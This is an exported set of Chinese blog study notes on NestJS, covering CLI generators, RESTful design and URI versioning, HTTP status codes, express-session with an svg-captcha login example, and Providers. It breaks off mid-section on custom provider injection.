<span class="title function_">getHello</span>(): <span class="built_in">string</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">appService</span>.<span class="title function_">getHello</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="app-service-ts"><a href="#app-service-ts" class="headerlink" title="app.service.ts"></a>app.service.ts</h2><p>服务层，封装通用的业务逻辑、与数据层的交互（例如数据库）、其他额外的一些三方请求</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">Injectable</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;@nestjs/common&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Injectable</span>()</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> <span class="title class_">AppService</span> &#123;</span><br><span class="line">  <span class="title function_">getHello</span>(): <span class="built_in">string</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello World!&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="Nestjs-cli常用命令"><a href="#Nestjs-cli常用命令" class="headerlink" title="Nestjs cli常用命令"></a>Nestjs cli常用命令</h1><p>查看nestjs所有的命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nest --help</span><br></pre></td></tr></table></figure>

<p>生成controller.ts：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nest g co user</span><br></pre></td></tr></table></figure>

<p>生成module.ts：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nest g mo user</span><br></pre></td></tr></table></figure>

<p>生成service.ts：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nest g s user</span><br></pre></td></tr></table></figure>

<p>直接生成一套CRUD模板：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nest g resource xiaoman</span><br></pre></td></tr></table></figure>

<blockquote>
<p>初次使用该命令时，除了生成文件，还会使用npm添加依赖，此后就不会了</p>
</blockquote>
]]></content>
      <categories>
        <category>前端</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>学习</tag>
        <tag>Nestjs</tag>
      </tags>
  </entry>
  <entry>
    <title>RESTful风格设计</title>
    <url>/web/study/Nestjs/4.RESTful%E9%A3%8E%E6%A0%BC%E8%AE%BE%E8%AE%A1.html</url>
    <content><![CDATA[<p>本系列为视频课程的学习笔记。原课程：<a href="https://www.bilibili.com/video/BV1NG41187Bs/?spm_id_from=333.999.0.0">Nestjs 全家桶系列</a></p>
<h1 id="RESTful"><a href="#RESTful" class="headerlink" title="RESTful"></a>RESTful</h1><p>RESTful是一种代码风格，不是一种标准，不必遵循</p>
<p>在RESTful中，一切都被认为是资源，每个资源有对应的URL标识</p>
<h1 id="RESTful规范"><a href="#RESTful规范" class="headerlink" title="RESTful规范"></a>RESTful规范</h1><h2 id="接口url"><a href="#接口url" class="headerlink" title="接口url"></a>接口url</h2><h3 id="传统接口"><a href="#传统接口" class="headerlink" title="传统接口"></a>传统接口</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://localhost:8080/api/get_list?id=1</span><br><span class="line">http://localhost:8080/api/delete_list?id=1</span><br><span class="line">http://localhost:8080/api/update_list?id=1</span><br></pre></td></tr></table></figure>

<p>接口尾部携带参数</p>
<h3 id="RESTful接口"><a href="#RESTful接口" class="headerlink" title="RESTful接口"></a>RESTful接口</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://localhost:8080/api/get_list/1</span><br></pre></td></tr></table></figure>

<p>RESTful风格，只使用一个接口就完成增删改差</p>
<p>不同的操作通过不同的请求方式（GET、POST、PUT、PATCH、DELETE等）和请求路径区分</p>
<h2 id="版本控制"><a href="#版本控制" class="headerlink" title="版本控制"></a>版本控制</h2><p>版本控制风格一共有三种：</p>
<ul>
<li>URI Versioning   版本将在请求的URI中传递</li>
<li>Header Versioning   自定义请求标头将指定版本</li>
<li>Media Type Versioning   请求的Accept标头将指定版本</li>
</ul>
<p>一般用第一种，更加语义化</p>
<p>main：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">NestFactory</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;@nestjs/core&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">VersioningType</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;@nestjs/common&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">AppModule</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;./app.module&#x27;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">bootstrap</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> app = <span class="keyword">await</span> <span class="title class_">NestFactory</span>.<span class="title function_">create</span>(<span class="title class_">AppModule</span>);</span><br><span class="line">  app.<span class="title function_">enableVersioning</span>(&#123;</span><br><span class="line">    <span class="comment">// 选择版本控制风格</span></span><br><span class="line">    <span class="attr">type</span>: <span class="title class_">VersioningType</span>.<span class="property">URI</span>,</span><br><span class="line">  &#125;)</span><br><span class="line">  <span class="keyword">await</span> app.<span class="title function_">listen</span>(<span class="number">3000</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">bootstrap</span>();</span><br></pre></td></tr></table></figure>

<p>conrtoller：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">Controller</span>, <span class="title class_">Get</span>, <span class="title class_">Post</span>, <span class="title class_">Body</span>, <span class="title class_">Patch</span>, <span class="title class_">Param</span>, <span class="title class_">Delete</span>, <span class="title class_">Version</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;@nestjs/common&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">UserService</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;./user.service&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">CreateUserDto</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;./dto/create-user.dto&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">UpdateUserDto</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;./dto/update-user.dto&#x27;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 可以配置版本</span></span><br><span class="line"><span class="meta">@Controller</span>(&#123;</span><br><span class="line">  <span class="attr">path</span>:<span class="string">&quot;user&quot;</span>,</span><br><span class="line">  <span class="attr">version</span>:<span class="string">&#x27;1&#x27;</span></span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> <span class="title class_">UserController</span> &#123;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params"><span class="keyword">private</span> <span class="keyword">readonly</span> userService: UserService</span>) &#123;&#125;</span><br><span class="line"> </span><br><span class="line">  <span class="meta">@Post</span>()</span><br><span class="line">  <span class="title function_">create</span>(<span class="params"><span class="meta">@Body</span>() createUserDto: CreateUserDto</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">userService</span>.<span class="title function_">create</span>(createUserDto);</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="meta">@Get</span>()</span><br><span class="line">  <span class="comment">// 这样是只给某个接口加</span></span><br><span class="line">  <span class="comment">// @Version(&#x27;1&#x27;)</span></span><br><span class="line">  <span class="title function_">findAll</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">userService</span>.<span class="title function_">findAll</span>();</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="meta">@Get</span>(<span class="string">&#x27;:id&#x27;</span>)</span><br><span class="line">  <span class="title function_">findOne</span>(<span class="params"><span class="meta">@Param</span>(<span class="string">&#x27;id&#x27;</span>) id: <span class="built_in">string</span></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">userService</span>.<span class="title function_">findOne</span>(+id);</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="meta">@Patch</span>(<span class="string">&#x27;:id&#x27;</span>)</span><br><span class="line">  <span class="title function_">update</span>(<span class="params"><span class="meta">@Param</span>(<span class="string">&#x27;id&#x27;</span>) id: <span class="built_in">string</span>, <span class="meta">@Body</span>() updateUserDto: UpdateUserDto</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">userService</span>.<span class="title function_">update</span>(+id, updateUserDto);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Code码"><a href="#Code码" class="headerlink" title="Code码"></a>Code码</h2><table>
<thead>
<tr>
<th>码</th>
<th>英文含义</th>
<th>中文含义</th>
</tr>
</thead>
<tbody><tr>
<td>200</td>
<td>OK</td>
<td>成功</td>
</tr>
<tr>
<td>304</td>
<td>Not Modified</td>
<td>协商缓存了</td>
</tr>
<tr>
<td>400</td>
<td>Bad Request</td>
<td>参数错误</td>
</tr>
<tr>
<td>401</td>
<td>Unauthorized token</td>
<td>错误</td>
</tr>
<tr>
<td>403</td>
<td>Forbidden referer origin</td>
<td>验证失败</td>
</tr>
<tr>
<td>404</td>
<td>Not Found</td>
<td>接口不存在</td>
</tr>
<tr>
<td>500</td>
<td>Internal Server Error</td>
<td>服务端错误</td>
</tr>
<tr>
<td>502</td>
<td>Bad Gateway</td>
<td>上游接口有问题或者服务器问题</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>前端</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>学习</tag>
        <tag>Nestjs</tag>
      </tags>
  </entry>
  <entry>
    <title>Session</title>
    <url>/web/study/Nestjs/6.Session.html</url>
    <content><![CDATA[<p>本系列为视频课程的学习笔记。原课程：<a href="https://www.bilibili.com/video/BV1NG41187Bs/?spm_id_from=333.999.0.0">Nestjs 全家桶系列</a></p>
<h1 id="Session"><a href="#Session" class="headerlink" title="Session"></a>Session</h1><p>session是服务器为每个用户的浏览器创建的一个会话对象</p>
<p>session会被记录到浏览器的cookie中，用来区分用户</p>
<h1 id="Nestjs-Session"><a href="#Nestjs-Session" class="headerlink" title="Nestjs Session"></a>Nestjs Session</h1><p>如果将Nestjs的默认框架指定为express，意味着项目支持express的插件，所以可以安装express的session</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm i express-session --save</span><br></pre></td></tr></table></figure>

<p>需要智能提示可以安装声明依赖</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm i @types/express-session -D</span><br></pre></td></tr></table></figure>

<p>然后在main.ts引入，通过app.use注册session</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> * <span class="keyword">as</span> session <span class="keyword">from</span> <span class="string">&#x27;express-session&#x27;</span></span><br><span class="line"> </span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">session</span>())</span><br></pre></td></tr></table></figure>

<p>配置项：</p>
<table>
<thead>
<tr>
<th>键名</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>secret</td>
<td>生成服务端session签名，可以理解为加盐</td>
</tr>
<tr>
<td>name</td>
<td>生成客户端cookie的名字，默认为connect.sid</td>
</tr>
<tr>
<td>cookie</td>
<td>设置返回到前端key的属性，默认值为<code>&#123; path: ‘/’, httpOnly: true, secure: false, maxAge: null &#125;</code></td>
</tr>
<tr>
<td>rolling</td>
<td>在每次请求时强行设置cookie，这将重置cookie过期时间，默认值为false</td>
</tr>
</tbody></table>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">NestFactory</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;@nestjs/core&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">VersioningType</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;@nestjs/common&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">AppModule</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;./app.module&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> * <span class="keyword">as</span> session <span class="keyword">from</span> <span class="string">&#x27;express-session&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">bootstrap</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> app = <span class="keyword">await</span> <span class="title class_">NestFactory</span>.<span class="title function_">create</span>(<span class="title class_">AppModule</span>);</span><br><span class="line">  app.<span class="title function_">enableVersioning</span>(&#123;</span><br><span class="line">    <span class="attr">type</span>: <span class="title class_">VersioningType</span>.<span class="property">URI</span>,</span><br><span class="line">  &#125;);</span><br><span class="line">  app.<span class="title function_">use</span>(</span><br><span class="line">    <span class="title function_">session</span>(&#123;</span><br><span class="line">      <span class="attr">secret</span>: <span class="string">&#x27;yajue&#x27;</span>,</span><br><span class="line">      <span class="attr">name</span>: <span class="string">&#x27;yjsp.session&#x27;</span>,</span><br><span class="line">      <span class="attr">rolling</span>: <span class="literal">true</span>,</span><br><span class="line">      <span class="attr">cookie</span>: &#123; <span class="attr">maxAge</span>: <span class="literal">null</span> &#125;,</span><br><span class="line">    &#125;),</span><br><span class="line">  );</span><br><span class="line">  <span class="keyword">await</span> app.<span class="title function_">listen</span>(<span class="number">3000</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">bootstrap</span>();</span><br></pre></td></tr></table></figure>

<h1 id="验证码案例"><a href="#验证码案例" class="headerlink" title="验证码案例"></a>验证码案例</h1><h2 id="前端"><a href="#前端" class="headerlink" title="前端"></a>前端</h2><p>安装element-plus：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install element-plus -S</span><br></pre></td></tr></table></figure>

<p>页面（App.vue）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class=&quot;wraps&quot;&gt;</span><br><span class="line">    &lt;el-form :label-position=&quot;labelPosition&quot; label-width=&quot;100px&quot; :model=&quot;formLabelAlign&quot; style=&quot;max-width: 460px&quot;&gt;</span><br><span class="line">      &lt;el-form-item label=&quot;账号&quot;&gt;</span><br><span class="line">        &lt;el-input v-model=&quot;formLabelAlign.name&quot; /&gt;</span><br><span class="line">      &lt;/el-form-item&gt;</span><br><span class="line">      &lt;el-form-item label=&quot;密码&quot;&gt;</span><br><span class="line">        &lt;el-input type=&quot;password&quot; v-model=&quot;formLabelAlign.password&quot; /&gt;</span><br><span class="line">      &lt;/el-form-item&gt;</span><br><span class="line">      &lt;el-form-item label=&quot;验证码&quot;&gt;</span><br><span class="line">        &lt;div style=&quot;display:flex&quot;&gt;</span><br><span class="line">          &lt;el-input v-model=&quot;formLabelAlign.code&quot; /&gt;</span><br><span class="line">          &lt;img @click=&quot;resetCode&quot; :src=&quot;codeUrl&quot; alt=&quot;&quot;&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">      &lt;/el-form-item&gt;</span><br><span class="line">      &lt;el-form-item&gt;</span><br><span class="line">        &lt;el-button @click=&quot;submit&quot;&gt;登录&lt;/el-button&gt;</span><br><span class="line">      &lt;/el-form-item&gt;</span><br><span class="line">    &lt;/el-form&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line">  </span><br><span class="line">&lt;script setup lang=&#x27;ts&#x27;&gt;</span><br><span class="line">import &#123; reactive, ref &#125; from &#x27;vue&#x27;;</span><br><span class="line"></span><br><span class="line">const codeUrl = ref&lt;string&gt;(&#x27;/api/user/code&#x27;)</span><br><span class="line"></span><br><span class="line">const resetCode = () =&gt; codeUrl.value = codeUrl.value + &#x27;?&#x27; + Math.random()</span><br><span class="line"></span><br><span class="line">const labelPosition = ref&lt;string&gt;(&#x27;right&#x27;)</span><br><span class="line"></span><br><span class="line">const formLabelAlign = reactive(&#123;</span><br><span class="line">  name: &quot;&quot;,</span><br><span class="line">  password: &quot;&quot;,</span><br><span class="line">  code: &quot;&quot;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">const submit = async () =&gt; &#123;</span><br><span class="line">  // 如果使用axios，请求时默认不携带cookie</span><br><span class="line">  // 可以使用axios.defaults.withCredentials=true使其携带</span><br><span class="line">  await fetch(&#x27;/api/user/create&#x27;, &#123;</span><br><span class="line">    method: &quot;POST&quot;,</span><br><span class="line">    body: JSON.stringify(formLabelAlign),</span><br><span class="line">    headers: &#123;</span><br><span class="line">      &#x27;content-type&#x27;: &#x27;application/json&#x27;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;).then(res =&gt; res.json())</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">  </span><br><span class="line">&lt;style&gt;</span><br><span class="line">* &#123;</span><br><span class="line">  padding: 0;</span><br><span class="line">  margin: 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">.wraps &#123;</span><br><span class="line">  display: flex;</span><br><span class="line">  justify-content: center;</span><br><span class="line">  align-items: center;</span><br><span class="line">  height: inherit;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">html,</span><br><span class="line">body,</span><br><span class="line">#app &#123;</span><br><span class="line">  height: 100%;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>

<p>跨域设置：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="attr">proxy</span>:&#123;</span><br><span class="line">  <span class="string">&#x27;/api&#x27;</span>:&#123;</span><br><span class="line">     <span class="attr">target</span>:<span class="string">&#x27;http://localhost:3000/&#x27;</span>,</span><br><span class="line">     <span class="attr">changeOrigin</span>:<span class="literal">true</span>,</span><br><span class="line">     <span class="attr">rewrite</span>: <span class="function"><span class="params">path</span> =&gt;</span> path.<span class="title function_">replace</span>(<span class="regexp">/^\/api/</span>, <span class="string">&#x27;&#x27;</span>),</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="后端"><a href="#后端" class="headerlink" title="后端"></a>后端</h2><p>安装验证码插件svg-captcha：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install svg-captcha -S</span><br></pre></td></tr></table></figure>

<p>controller：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;</span><br><span class="line">  <span class="title class_">Controller</span>,</span><br><span class="line">  <span class="title class_">Get</span>,</span><br><span class="line">  <span class="title class_">Post</span>,</span><br><span class="line">  <span class="title class_">Body</span>,</span><br><span class="line">  <span class="title class_">Request</span>,</span><br><span class="line">  <span class="title class_">Response</span>,</span><br><span class="line">  <span class="title class_">Session</span>,</span><br><span class="line">&#125; <span class="keyword">from</span> <span class="string">&#x27;@nestjs/common&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">UserService</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;./user.service&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">CreateUserDto</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;./dto/create-user.dto&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">UpdateUserDto</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;./dto/update-user.dto&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> * <span class="keyword">as</span> svgCaptcha <span class="keyword">from</span> <span class="string">&#x27;svg-captcha&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span>(<span class="string">&#x27;user&#x27;</span>)</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> <span class="title class_">UserController</span> &#123;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params"><span class="keyword">private</span> <span class="keyword">readonly</span> userService: UserService</span>) &#123;&#125;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@Get</span>(<span class="string">&#x27;code&#x27;</span>)</span><br><span class="line">  <span class="title function_">createCode</span>(<span class="params"><span class="meta">@Request</span>() req, <span class="meta">@Response</span>() res, <span class="meta">@Session</span>() session</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="title class_">Captcha</span> = svgCaptcha.<span class="title function_">create</span>(&#123;</span><br><span class="line">      <span class="attr">size</span>: <span class="number">4</span>, <span class="comment">// 字符数</span></span><br><span class="line">      <span class="attr">fontSize</span>: <span class="number">50</span>, <span class="comment">// 字符大小</span></span><br><span class="line">      <span class="attr">width</span>: <span class="number">100</span>, <span class="comment">// 图片宽度</span></span><br><span class="line">      <span class="attr">height</span>: <span class="number">34</span>, <span class="comment">// 图片高度</span></span><br><span class="line">      <span class="attr">background</span>: <span class="string">&#x27;#cc9966&#x27;</span>, <span class="comment">// 图片背景颜色</span></span><br><span class="line">    &#125;);</span><br><span class="line">    session.<span class="property">code</span> = <span class="title class_">Captcha</span>.<span class="property">text</span>;</span><br><span class="line">    res.<span class="title function_">type</span>(<span class="string">&#x27;image/svg+xml&#x27;</span>);</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="title class_">Captcha</span>.<span class="property">data</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@Post</span>(<span class="string">&#x27;create&#x27;</span>)</span><br><span class="line">  <span class="title function_">createUser</span>(<span class="params"><span class="meta">@Body</span>() body, <span class="meta">@Session</span>() session</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(body, session.<span class="property">code</span>);</span><br><span class="line">    <span class="keyword">if</span> (session.<span class="property">code</span>?.<span class="title function_">toLocaleLowerCase</span>() === body?.<span class="property">code</span>?.<span class="title function_">toLocaleLowerCase</span>()) &#123;</span><br><span class="line">      <span class="keyword">return</span> &#123;</span><br><span class="line">        <span class="attr">code</span>: <span class="number">200</span>,</span><br><span class="line">        <span class="attr">message</span>: <span class="string">&#x27;验证码正确&#x27;</span>,</span><br><span class="line">      &#125;;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> &#123;</span><br><span class="line">        <span class="attr">code</span>: <span class="number">200</span>,</span><br><span class="line">        <span class="attr">message</span>: <span class="string">&#x27;验证码错误&#x27;</span>,</span><br><span class="line">      &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>前端</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>学习</tag>
        <tag>Nestjs</tag>
      </tags>
  </entry>
  <entry>
    <title>Providers</title>
    <url>/web/study/Nestjs/7.Providers.html</url>
    <content><![CDATA[<p>本系列为视频课程的学习笔记。原课程：<a href="https://www.bilibili.com/video/BV1NG41187Bs/?spm_id_from=333.999.0.0">Nestjs 全家桶系列</a></p>
<h1 id="Providers"><a href="#Providers" class="headerlink" title="Providers"></a>Providers</h1><p>Providers是Nest的一个基本概念</p>
<p>许多基本Nest类都可以被视为Provider：service、repository、factory、helper，等等</p>
<p>它们都可以通过constructor注入依赖关系，这意味着对象可以彼此创建各种关系，并且”连接“对象实例的功能在很大程度上可以委托给Nest运行时系统</p>
<p>Provider是一个用@Injectable()装饰器注释的类</p>
<blockquote>
<p>个人理解：Provide类似Spring的@Bean？</p>
</blockquote>
<h1 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h1><h2 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h2><p>Service中使用了@Injectable：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">Injectable</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;@nestjs/common&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使这个类为一个Provider</span></span><br><span class="line"><span class="meta">@Injectable</span>()</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> <span class="title class_">AppService</span> &#123;</span><br><span class="line">  <span class="title function_">getHello</span>(): <span class="built_in">string</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;hello!&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Module中导入了Service，并将Service注入Providers：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">Module</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;@nestjs/common&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">AppController</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;./app.controller&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">AppService</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;./app.service&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">UserModule</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;./user/user.module&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Module</span>(&#123;</span><br><span class="line">  <span class="attr">imports</span>: [<span class="title class_">UserModule</span>],</span><br><span class="line">  <span class="attr">controllers</span>: [<span class="title class_">AppController</span>],</span><br><span class="line">  <span class="comment">// 使这个类被注入Providers中</span></span><br><span class="line">  <span class="attr">providers</span>: [<span class="title class_">AppService</span>],</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> <span class="title class_">AppModule</span> &#123;&#125;</span><br></pre></td></tr></table></figure>

<p>在Controller中使用注入好的Service：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">Controller</span>, <span class="title class_">Get</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;@nestjs/common&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">AppService</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;./app.service&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span>(<span class="string">&#x27;get&#x27;</span>)</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> <span class="title class_">AppController</span> &#123;</span><br><span class="line">  <span class="comment">// 依赖注入Service</span></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params"><span class="keyword">private</span> <span class="keyword">readonly</span> appService: AppService</span>) &#123;&#125;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@Get</span>(<span class="string">&#x27;hello&#x27;</span>)</span><br><span class="line">  <span class="title function_">getHello</span>(): <span class="built_in">string</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">appService</span>.<span class="title function_">getHello</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="自定义名称"><a href="#自定义名称" class="headerlink" title="自定义名称"></a>自定义名称</h2><p>注入Providers时给Service起个自定义名称：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">Module</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;@nestjs/common&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">AppController</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;./app.controller&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">AppService</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;./app.service&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">UserModule</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;./user/user.module&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Module</span>(&#123;</span><br><span class="line">  <span class="attr">imports</span>: [<span class="title class_">UserModule</span>],</span><br><span class="line">  <span class="attr">controllers</span>: [<span class="title class_">AppController</span>],</span><br><span class="line">  <span class="attr">providers</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">// 给这个Provider起名为omg</span></span><br><span class="line">      <span class="attr">provide</span>: <span class="string">&#x27;omg&#x27;</span>,</span><br><span class="line">      <span class="attr">useClass</span>: <span class="title class_">AppService</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">  ],</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> <span class="title class_">AppModule</span> &#123;&#125;</span><br></pre></td></tr></table></figure>

<p>使用@Inject通过自定义名称找到Provider：</p>
